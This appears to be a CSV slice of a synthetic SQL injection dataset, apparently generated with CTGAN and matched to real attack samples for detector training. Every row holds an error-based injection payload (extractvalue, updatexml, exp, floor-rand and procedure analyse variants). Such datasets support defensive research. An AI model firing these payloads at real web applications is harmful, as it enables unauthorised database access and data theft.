id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000468,attack,error,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",nearest_attack_euclidean,R000538,4.464147731779976
CTGAN_000469,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000711,5.769516214892181
CTGAN_000470,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'asdc' like 'asdc",nearest_attack_euclidean,R000115,5.995415470468825
CTGAN_000471,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000734,6.719818633091169
CTGAN_000472,attack,error,"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000138,5.76546036628924
CTGAN_000473,attack,error,"1%'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000708,6.2832920872350275
CTGAN_000474,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000102,6.946816108311407
CTGAN_000475,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",nearest_attack_euclidean,R000569,6.0698786824714945
CTGAN_000476,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000734,6.565131204360527
CTGAN_000477,attack,error,"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000573,6.384060042333598
CTGAN_000478,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000272,6.563531666849699
CTGAN_000479,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000249,5.1532658751323694
CTGAN_000480,attack,error,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000206,5.5842139312534
CTGAN_000481,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",nearest_attack_euclidean,R000097,5.619290757067979
CTGAN_000482,attack,error,"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '",nearest_attack_euclidean,R000135,4.586361000480089
CTGAN_000483,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000086,7.097791501800086
CTGAN_000484,attack,error,"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000111,6.783667820700112
CTGAN_000485,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000455,7.416554079064726
CTGAN_000486,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R000587,4.335032607875635
CTGAN_000487,attack,error,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000222,5.9288501102071365
CTGAN_000488,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'bacm'  =  'bacm",nearest_attack_euclidean,R000758,5.451030424917627
CTGAN_000489,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000113,6.036574501161329
CTGAN_000490,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000058,4.576460081066733
CTGAN_000491,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000638,6.630409334267229
CTGAN_000492,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000390,6.650674292678205
CTGAN_000493,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000746,5.717435370584133
CTGAN_000494,attack,error,"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000485,6.376995326201407
CTGAN_000495,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R000182,3.696604223973932
CTGAN_000496,attack,error,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'dgwe' like 'dgwe",nearest_attack_euclidean,R000710,6.128151595889537
CTGAN_000497,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000602,5.015699807306819
CTGAN_000498,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000086,5.644335751542359
CTGAN_000499,attack,error,"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",nearest_attack_euclidean,R000298,5.142311682111142
CTGAN_000500,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000086,4.618089771788254
